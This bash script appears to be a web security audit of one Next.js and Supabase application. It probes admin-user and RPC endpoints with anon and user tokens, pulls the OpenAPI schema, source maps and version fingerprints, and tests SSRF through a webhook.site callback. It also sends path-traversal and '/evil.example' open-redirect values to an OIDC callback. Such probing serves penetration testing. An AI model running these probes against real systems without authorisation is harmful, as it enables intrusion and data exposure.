#!/bin/bash
# Extra surface checks: Next.js build manifest / rewrites, proxy routes, OpenAPI schema,
# OIDC callback handling, unauthenticated generators, version fingerprint.
source "$(dirname "$0")/env.sh"

BUILD="S2HurGa5cGUpA5514zy3f"

echo "########## 1. Next.js build manifest + chunk map ##########"
req GET "$SITE/_next/static/$BUILD/_buildManifest.js"
req GET "$SITE/_next/static/$BUILD/_ssgManifest.js"
req GET "$SITE/_next/static/chunks/app/layout-1ae860a63767d4a9.js"

echo "########## 2. Rewrite-derived routes (per buildManifest) ##########"
req GET "$SITE/api/status/1/example"
req POST "$SITE/api/status/1/example" -H "Content-Type: application/json" -d '{}'
req GET "$SITE/status/example"
req GET "$SITE/api/process/1"
req POST "$SITE/api/process/1" -H "Content-Type: application/json" -d '{}'
req GET "$SITE/process"

echo "########## 3. /api/supabase proxy behaviour ##########"
req GET "$SITE/api/supabase/rest/v1/profiles?select=user_id&limit=1" -H "apikey: $KEY"
req GET "$SITE/api/supabase/rest/v1/profiles?select=user_id&limit=1" -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN"
req GET "$SITE/api/supabase/storage/v1/bucket" -H "apikey: $KEY"
req GET "$SITE/api/supabase/auth/v1/admin/users" -H "apikey: $KEY"
req GET "$SITE/api/supabase/auth/v1/admin/users" -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN"
req GET "$SITE/api/supabase/rest/v1/rpc/get_users" -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN"

echo "########## 4. PostgREST OpenAPI / root schema disclosure ##########"
req GET "$SUPA/rest/v1/" -H "apikey: $KEY" -H "Accept: application/openapi+json"
curl -sS -k -m 25 -A "$UA" -H "apikey: $KEY" -H "Accept: application/openapi+json" -o /tmp/openapi_anon.json -w 'openapi anon bytes=%{size_download} code=%{http_code}\n' "$SUPA/rest/v1/"
curl -sS -k -m 25 -A "$UA" -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN" -H "Accept: application/openapi+json" -o /tmp/openapi_auth.json -w 'openapi auth bytes=%{size_download} code=%{http_code}\n' "$SUPA/rest/v1/"
if [ -s /tmp/openapi_anon.json ]; then head -c 1200 /tmp/openapi_anon.json; echo; fi

echo "########## 5. Auth settings (GoTrue) ##########"
req GET "$SUPA/auth/v1/settings" -H "apikey: $KEY"
req GET "$SUPA/auth/v1/health"

echo "########## 6. Unauthenticated generation endpoints ##########"
for ep in generate-qr generate-code128 generate-code39 generate-datamatrix generate-itf generate-pdf417 generate-signature; do
  req POST "$SITE/api/$ep" -H "Content-Type: application/json" -d '{"text":"audit","data":"audit"}'
done
req GET "$SITE/api/generate-qr?text=audit&data=audit"

echo "########## 7. remove-background without auth (multipart) ##########"
printf 'not-an-image' > /tmp/notimg.bin
req POST "$SITE/api/remove-background" -F "file=@/tmp/notimg.bin;type=image/png"
req POST "$SITE/api/remove-background" -H "Content-Type: application/json" -d '{"url":"https://webhook.site/385d7c4b-5f1a-4bee-b1e7-4a3321bcd317","imageUrl":"https://webhook.site/385d7c4b-5f1a-4bee-b1e7-4a3321bcd317"}'

echo "########## 8. OIDC callback handling ##########"
for u in "/api/auth/telegram-oidc/callback" "/api/auth/telegram-oidc/callback?code=x&state=y" "/api/auth/telegram-oidc/callback?error=access_denied&state=../../evil" "/api/auth/telegram-oidc/start?locale=de&redirect=/evil.example"; do
  code=$(curl -sS -k -m 20 -A "$UA" -D /tmp/h.txt -o /tmp/b.bin -w "%{http_code}" "$SITE$u")
  echo "GET $u -> $code"
  grep -iE "^(location|set-cookie|content-type)" /tmp/h.txt | sed 's/\r$//'
  head -c 300 /tmp/b.bin; echo
done

echo "########## 9. Next.js version fingerprint from chunks ##########"
cd /tmp 2>/dev/null
for f in webpack-3219caacd565a7bb main-app-ccdb2cd92e15df7d 4bd1b696-1fc9c04a2f3113b7; do
  code=$(curl -sS -k -m 25 -A "$UA" -o "/tmp/next_$f.js" -w "%{http_code}" "$SITE/_next/static/chunks/$f.js")
  echo "chunk $f -> $code bytes=$(wc -c < "/tmp/next_$f.js")"
done
grep -ohE '"(1[3-6]\.[0-9]{1,2}\.[0-9]{1,3}[^"]*)"' /tmp/next_*.js 2>/dev/null | sort -u | head
grep -ohE 'next@[0-9.]+|Next\.js [0-9.]+|version:"1[3-6]\.[0-9.]+' /tmp/next_*.js 2>/dev/null | sort -u | head

echo "########## 10. source map exposure ##########"
for m in "/_next/static/chunks/app/page-bf5f8970043f7336.js.map" "/_next/static/chunks/app/layout-1ae860a63767d4a9.js.map" "/_next/static/chunks/webpack-3219caacd565a7bb.js.map" "/_next/static/$BUILD/_buildManifest.js.map"; do
  code=$(curl -sS -k -m 20 -A "$UA" -o /tmp/m.bin -w "%{http_code}" "$SITE$m")
  echo "GET $m -> $code bytes=$(wc -c < /tmp/m.bin) head=$(head -c 60 /tmp/m.bin)"
done

echo "########## 11. RPC get_jobs_time_series signature attempts ##########"
for body in '{}' '{"days":7}' '{"p_days":7}' '{"period":"7 days"}' '{"interval":"7 days"}' '{"p_interval":"7 days"}' '{"p_period":"7 days"}' '{"time_series":true}' '{"limit":7}'; do
  code=$(curl -sS -k -m 15 -A "$UA" -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -X POST -d "$body" -o /tmp/r.bin -w "%{http_code}" "$SUPA/rest/v1/rpc/get_jobs_time_series")
  echo "get_jobs_time_series $body -> $code : $(head -c 300 /tmp/r.bin | tr -d '\n')"
done
